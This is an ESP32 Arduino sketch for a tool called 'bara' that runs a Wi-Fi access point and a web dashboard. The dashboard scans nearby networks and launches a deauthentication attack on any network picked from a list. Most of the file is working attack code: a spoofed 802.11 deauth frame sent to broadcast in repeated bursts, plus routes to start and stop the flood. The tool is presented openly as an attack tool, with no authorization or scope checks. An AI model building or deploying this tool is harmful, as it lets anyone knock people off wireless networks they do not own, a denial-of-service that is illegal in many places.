// bara.ino
// Tool Name: bara
// Developer: Ahmed Nour Ahmed from Qena
// Purpose: Wi-Fi scanner + Deauth tool with intense hacker aesthetic
// Language: English
// ESP32 Wi-Fi AP + Web Server + Deauth Capability

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <WiFiClient.h>

const char* ssid = "bara";
const char* password = "A7med@Elshab7";

WebServer server(80);

// Deauth variables
uint8_t deauth_target_bssid[6];
bool deauth_active = false;
uint8_t deauth_channel = 0;
unsigned long last_deauth = 0;
const unsigned long deauth_interval = 100; // ms

// Scan results
String scanResults = "";
int scanNetworks = 0;

// Deauth packet template (802.11 Disassociation Frame)
uint8_t deauthPacket[26] = {
  /*  0 - 1 */ 0xC0, 0x00,                           // Type: Deauth (C0), Flags: 00
  /*  2 - 3 */ 0x00, 0x00,                           // Duration (will be set per frame)
  /*  4 - 9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Destination: broadcast
  /* 10 -15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source: will be filled
  /* 16 -21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: same as source
  /* 22 -23 */ 0x00, 0x00,                           // Fragment & Seq (zero)
  /* 24 -25 */ 0x01, 0x00                            // Reason: Unspecified (1)
};

void sendDeauth() {
  if (!deauth_active || deauth_channel == 0) return;
  if (millis() - last_deauth < deauth_interval) return;

  last_deauth = millis();

  // Set source & BSSID in packet
  memcpy(&deauthPacket[10], deauth_target_bssid, 6);
  memcpy(&deauthPacket[16], deauth_target_bssid, 6);

  // Send deauth frame multiple times
  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  }
}

void scanWiFi() {
  scanNetworks = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
  scanResults = "";
  if (scanNetworks == 0) {
    scanResults = "<tr><td colspan='4' style='color:#ff5555;'>No networks found.</td></tr>";
  } else {
    for (int i = 0; i < scanNetworks; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0) ssid = "[Hidden]";
      int rssi = WiFi.RSSI(i);
      String security;
      switch (WiFi.encryptionType(i)) {
        case WIFI_AUTH_OPEN: security = "Open"; break;
        case WIFI_AUTH_WEP: security = "WEP"; break;
        case WIFI_AUTH_WPA_PSK: security = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: security = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: security = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA3_PSK: security = "WPA3"; break;
        default: security = "Unknown";
      }
      int channel = WiFi.channel(i);
      String row = "<tr>";
      row += "<td>" + ssid + "</td>";
      row += "<td>" + String(rssi) + " dBm</td>";
      row += "<td>" + security + "</td>";
      row += "<td>" + String(channel) + "</td>";
      row += "<td><button class='btn-deauth' onclick=\"deauth('" + WiFi.BSSIDstr(i) + "', " + String(channel) + ")\">DEAUTH</button></td>";
      row += "</tr>";
      scanResults += row;
    }
  }
}

String getWebPage() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BARA - ULTIMATE WIFI DEAUTH TOOL</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
      overflow-x: hidden;
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(255,0,0,0.1) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(255,0,0,0.15) 0%, transparent 25%);
    }
    h1 {
      text-align: center;
      font-size: 3.5em;
      margin: 10px 0;
      text-shadow: 0 0 15px #f00, 0 0 30px #f00;
      letter-spacing: 3px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { text-shadow: 0 0 10px #f00; }
      50% { text-shadow: 0 0 25px #ff0000, 0 0 40px #ff0000; }
      100% { text-shadow: 0 0 10px #f00; }
    }
    .header {
      text-align: center;
      color: #ff5555;
      margin-bottom: 20px;
      border-bottom: 2px solid #ff0000;
      padding-bottom: 10px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: rgba(20, 5, 5, 0.7);
      box-shadow: 0 0 20px rgba(255,0,0,0.5);
    }
    th, td {
      padding: 12px;
      text-align: left;
      border: 1px solid #ff3333;
    }
    th {
      background: rgba(100, 0, 0, 0.8);
      color: #ff9999;
    }
    .btn-deauth {
      background: #800;
      color: #ff5555;
      border: 1px solid #ff0000;
      padding: 8px 16px;
      font-family: 'Courier New';
      font-weight: bold;
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-deauth:hover {
      background: #ff0000;
      color: #000;
      box-shadow: 0 0 15px #ff5555;
      transform: scale(1.1);
    }
    .status {
      text-align: center;
      margin: 20px 0;
      font-size: 1.2em;
      color: #ff5555;
      min-height: 30px;
    }
    .scan-btn {
      display: block;
      margin: 20px auto;
      padding: 12px 30px;
      background: #300;
      color: #ff9999;
      border: 2px solid #ff5555;
      font-size: 1.3em;
      font-family: 'Courier New';
      cursor: pointer;
      transition: all 0.3s;
    }
    .scan-btn:hover {
      background: #ff0000;
      color: #000;
      box-shadow: 0 0 25px #ff5555;
      transform: scale(1.05);
    }
    .footer {
      margin-top: 40px;
      text-align: center;
      color: #700;
      font-size: 0.9em;
    }
    @media (max-width: 768px) {
      table, thead, tbody, th, td, tr {
        display: block;
      }
      tr {
        margin-bottom: 15px;
        border: 1px solid #ff3333;
        padding: 10px;
      }
      td {
        text-align: right;
        padding-left: 50%;
        position: relative;
      }
      td:before {
        content: attr(data-label);
        position: absolute;
        left: 10px;
        width: 45%;
        padding-right: 10px;
        white-space: nowrap;
        color: #ff9999;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>💀 BARA 💀</h1>
    <p>ULTIMATE WIFI DEAUTH TOOL BY AHMED NOUR AHMED FROM QENA</p>
  </div>

  <div class="status" id="status">Ready. Scan to begin.</div>

  <button class="scan-btn" onclick="scan()">SCAN WIFI NETWORKS</button>

  <table id="networks">
    <thead>
      <tr>
        <th>SSID</th>
        <th>RSSI</th>
        <th>Security</th>
        <th>Channel</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody id="networkList">
      <tr><td colspan="5">Click SCAN to detect networks.</td></tr>
    </tbody>
  </table>

  <div class="footer">
    <p>BARA v1.0 • POWERED BY ESP32 • DEAUTH ENGINE: ACTIVE</p>
  </div>

  <script>
    function playSound(type) {
      if (type === 'deauth') {
        let ctx = new (window.AudioContext || window.webkitAudioContext)();
        let osc = ctx.createOscillator();
        let gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = 200;
        gain.gain.value = 0.3;
        osc.start();
        setTimeout(() => { gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5); }, 10);
      } else if (type === 'scan') {
        let ctx = new AudioContext();
        let osc = ctx.createOscillator();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(800, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(400, ctx.currentTime + 0.3);
        osc.connect(ctx.destination);
        osc.start();
        osc.stop(ctx.currentTime + 0.3);
      }
    }

    function setStatus(msg) {
      document.getElementById('status').innerText = msg;
    }

    function scan() {
      setStatus('Scanning... (Please wait)');
      playSound('scan');
      fetch('/scan')
        .then(response => response.text())
        .then(html => {
          document.getElementById('networkList').innerHTML = html;
          setStatus('Scan complete. Networks found: ' + document.querySelectorAll('#networkList tr').length);
        })
        .catch(err => {
          setStatus('ERROR: ' + err);
        });
    }

    function deauth(bssid, channel) {
      if (!confirm('🚨 Launch DEAUTH attack on\\nBSSID: ' + bssid + '\\nChannel: ' + channel + '?')) return;
      setStatus('DEAUTH INITIATED: ' + bssid);
      playSound('deauth');
      fetch('/deauth?bssid=' + encodeURIComponent(bssid) + '&channel=' + channel)
        .then(() => {
          setTimeout(() => {
            setStatus('DEAUTH ACTIVE... (Press STOP to halt)');
            let stopBtn = document.createElement('button');
            stopBtn.innerText = '🛑 STOP DEAUTH';
            stopBtn.style.cssText = 'display:block;margin:10px auto;padding:10px;background:#000;color:#ff5555;border:2px solid #f00;font-family:monospace;cursor:pointer;';
            stopBtn.onclick = () => {
              fetch('/stop');
              setStatus('Deauth stopped.');
              stopBtn.remove();
            };
            document.querySelector('.status').appendChild(stopBtn);
          }, 500);
        });
    }
  </script>
</body>
</html>
)rawliteral";
  return html;
}

void handleRoot() {
  server.send(200, "text/html", getWebPage());
}

void handleScan() {
  scanWiFi();
  server.send(200, "text/html", scanResults);
}

void handleDeauth() {
  String bssidStr = server.arg("bssid");
  int channel = server.arg("channel").toInt();

  if (bssidStr.length() != 17) {
    server.send(400, "text/plain", "Invalid BSSID");
    return;
  }

  // Parse BSSID: "AA:BB:CC:DD:EE:FF"
  for (int i = 0; i < 6; i++) {
    deauth_target_bssid[i] = (uint8_t)strtol(bssidStr.substring(i*3, i*3+2).c_str(), NULL, 16);
  }
  deauth_channel = channel;
  deauth_active = true;

  // Switch ESP32 to target channel
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);

  server.send(200, "text/plain", "Deauth started");
}

void handleStop() {
  deauth_active = false;
  deauth_channel = 0;
  server.send(200, "text/plain", "Stopped");
}

void setup() {
  Serial.begin(115200);
  
  // Enable WiFi in AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  Serial.println("AP Started: " + String(ssid));

  // Start web server
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/deauth", HTTP_GET, handleDeauth);
  server.on("/stop", HTTP_GET, handleStop);
  server.begin();

  // Enable promiscuous mode for deauth
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_tx_cb([](uint8_t* buf, uint16_t len, bool tx) {});
}

void loop() {
  server.handleClient();
  sendDeauth();
  delay(1);
}
